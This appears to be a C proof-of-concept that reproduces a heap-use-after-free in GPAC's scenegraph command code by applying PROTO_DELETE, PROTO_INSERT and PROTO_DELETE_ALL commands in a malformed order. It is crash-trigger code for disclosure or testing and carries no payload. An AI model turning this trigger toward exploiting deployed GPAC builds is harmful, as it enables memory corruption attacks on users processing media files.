/*
 * Residual heap-use-after-free PoC for GF_SG_PROTO_INSERT handling in
 * src/scenegraph/commands.c (gf_sg_command_apply).
 *
 * Drives the public libgpac scenegraph command API exactly the way the
 * XMT/BT scene loaders and MP4Box's BT/XMT-to-ISO encoding path do
 * (see src/scene_manager/encode_isom.c, src/filters/load_bt_xmt.c): build
 * GF_Command objects and hand them to gf_sg_command_apply().
 *
 * Sequence (mirrors a malformed scene update stream where a PROTO_DELETE
 * command targets a proto ID that a not-yet-applied PROTO_INSERT command
 * still references in its new_proto_list):
 *   1. declare an unregistered proto "A"
 *   2. queue a PROTO_INSERT command whose new_proto_list holds "A"
 *   3. apply a PROTO_DELETE command (by ID) for "A" first -> frees it
 *   4. apply the still-pending PROTO_INSERT command -> "A" (dangling)
 *      gets promoted into graph->protos
 *   5. apply PROTO_DELETE_ALL -> walks graph->protos and dereferences
 *      the dangling entry (heap-use-after-free)
 */
#include <gpac/scenegraph.h>
#include <gpac/scenegraph_vrml.h>

int main(void)
{
	GF_SceneGraph *graph;
	GF_Proto *proto;
	GF_Command *com_insert, *com_delete, *com_delete_all;

	gf_sys_init(GF_MemTrackerNone, NULL);

	graph = gf_sg_new();

	proto = gf_sg_proto_new(graph, 42, "A", GF_TRUE);

	com_insert = gf_sg_command_new(graph, GF_SG_PROTO_INSERT);
	gf_list_add(com_insert->new_proto_list, proto);

	com_delete = gf_sg_command_new(graph, GF_SG_PROTO_DELETE);
	com_delete->del_proto_list = (u32*)gf_malloc(sizeof(u32));
	com_delete->del_proto_list[0] = 42;
	com_delete->del_proto_list_size = 1;

	com_delete_all = gf_sg_command_new(graph, GF_SG_PROTO_DELETE_ALL);

	/*delete-by-ID applies before the pending insert gets a chance to run*/
	gf_sg_command_apply(graph, com_delete, 0);
	gf_sg_command_apply(graph, com_insert, 0);
	gf_sg_command_apply(graph, com_delete_all, 0);

	gf_sg_command_del(com_insert);
	gf_sg_command_del(com_delete);
	gf_sg_command_del(com_delete_all);

	gf_sg_del(graph);

	gf_sys_close();
	return 0;
}
